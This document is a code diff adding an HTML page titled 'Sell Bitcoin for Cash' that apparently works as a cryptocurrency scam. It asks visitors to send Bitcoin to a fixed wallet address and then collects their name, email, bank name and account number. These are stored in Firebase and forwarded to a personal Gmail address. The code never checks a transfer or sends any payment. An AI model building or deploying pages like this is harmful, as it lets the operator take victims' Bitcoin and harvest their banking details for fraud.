@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sell Bitcoin for Cash</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-functions.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
+        .container { max-width: 500px; margin: auto; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.2); }
+        input, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { background: #28a745; color: white; font-size: 16px; cursor: pointer; transition: 0.3s ease-in-out; }
+        button:hover { background: #218838; }
+        button:disabled { background: gray; cursor: not-allowed; }
+        #loading { display: none; color: blue; }
+        #confirmationPage { display: none; animation: pulse 2s infinite; }
+        .bold-text { font-weight: bold; }
+        .fade-in { animation: fadeIn 1.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .copy-btn { background: #007bff; color: white; padding: 8px; margin-top: 5px; cursor: pointer; border: none; border-radius: 5px; transition: 0.3s; width: 150px; }
+        .copy-btn:hover { background: #0056b3; }
+        .instructions { font-size: 14px; color: #333; margin-top: 10px; text-align: left; }
+    </style>
+    <script>
+        // Firebase configuration
+        var firebaseConfig = {
+            apiKey: "AIzaSyCtLoXXW7Rkkja7HSBrkkcGqZsbj7kQLjw",
+            authDomain: "year2-9413b.firebaseapp.com",
+            projectId: "year2-9413b",
+            storageBucket: "year2-9413b.appspot.com",
+            messagingSenderId: "2455619631",
+            appId: "1:2455619631:web:2074d4ee6c517d38021eda"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        var db = firebase.firestore();
+        var functions = firebase.functions();
+        
+        function calculateAmount() {
+            let btcAmount = parseFloat(document.getElementById('btcAmount').value);
+            let rate = 65000;
+            let dollarAmount = btcAmount * rate;
+            document.getElementById('dollarAmount').innerHTML = `You will receive: <span class='bold-text'>$${dollarAmount.toLocaleString()}</span>`;
+        }
+        
+        function copyAddress() {
+            var copyText = document.getElementById("btcAddress");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(copyText.value);
+            alert("Bitcoin address copied!");
+        }
+        
+        function submitTransaction() {
+            if (!document.getElementById('confirmTransfer').checked) {
+                alert("Please confirm the Bitcoin transfer before proceeding.");
+                return;
+            }
+            
+            let name = document.getElementById('name').value;
+            let email = document.getElementById('email').value;
+            let btcAmount = document.getElementById('btcAmount').value;
+            let bankName = document.getElementById('bankName').value;
+            let bankAccount = document.getElementById('bankAccount').value;
+            let expectedAmount = btcAmount * 65000;
+            
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('formPage').style.display = 'none';
+            document.getElementById('confirmationPage').style.display = 'block';
+            document.getElementById('confirmAmount').innerHTML = `<span class='bold-text'>$${expectedAmount.toLocaleString()}</span>`;
+            document.getElementById('confirmationPage').classList.add('fade-in');
+            
+            db.collection("transactions").add({
+                name, email, btcAmount, bankName, bankAccount, expectedAmount,
+                status: "Processing",
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            }).then(() => {
+                sendEmail(name, email, btcAmount, expectedAmount, bankName, bankAccount);
+            }).catch(error => {
+                alert("Error submitting transaction: " + error);
+                document.getElementById('loading').style.display = 'none';
+            });
+        }
+        
+        function sendEmail(name, email, btcAmount, expectedAmount, bankName, bankAccount) {
+            var emailFunction = functions.httpsCallable("sendTransactionEmail");
+            emailFunction({
+                recipient: email,
+                adminEmail: "marshall12340@gmail.com",
+                name, btcAmount, expectedAmount, bankName, bankAccount
+            });
+        }
+    </script>
+</head>
+<body>
+    <h2>Sell Your Bitcoin for Cash</h2>
+    <div id="formPage" class="container">
+        <p>Send your Bitcoin to the address below:</p>
+        <input type="text" id="btcAddress" value="bc1qduk2py2dwc8aa37mvlnndh56lwqkrchs2yj2ej" readonly>
+        <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+        <p class="instructions">The first step to sell your Bitcoin for dollars is to copy the above Bitcoin address and transfer your desired Bitcoin value to it. After that, fill in all the required information including your bank details. Once your Bitcoin transfer is received, we will immediately process the equivalent dollar transfer to the provided bank account.</p>
+        <label for="name">Full Name:</label>
+        <input type="text" id="name" required>
+        <label for="email">Email Address:</label>
+        <input type="email" id="email" required>
+        <label for="btcAmount">Enter BTC Amount:</label>
+        <input type="number" id="btcAmount" step="0.0001" oninput="calculateAmount()" required>
+        <p id="dollarAmount">You will receive: <span class='bold-text'>$0</span></p>
+        <label for="bankName">Bank Name:</label>
+        <input type="text" id="bankName" required>
+        <label for="bankAccount">Bank Account Number:</label>
+        <input type="text" id="bankAccount" required>
+        <label><input type="checkbox" id="confirmTransfer"> I confirm that I have transferred the Bitcoin</label>
+        <button onclick="submitTransaction()">Submit Transaction</button>
+        <p id="loading">Processing...</p>
+    </div>
+    <div id="confirmationPage" class="container fade-in">
+        <h3>Transaction is being processed...</h3>
+        <p>Your expected amount: <span id="confirmAmount"></span></p>
+        <p>Please wait while we confirm your transfer.</p>
+    </div>
+</body>
+</html>
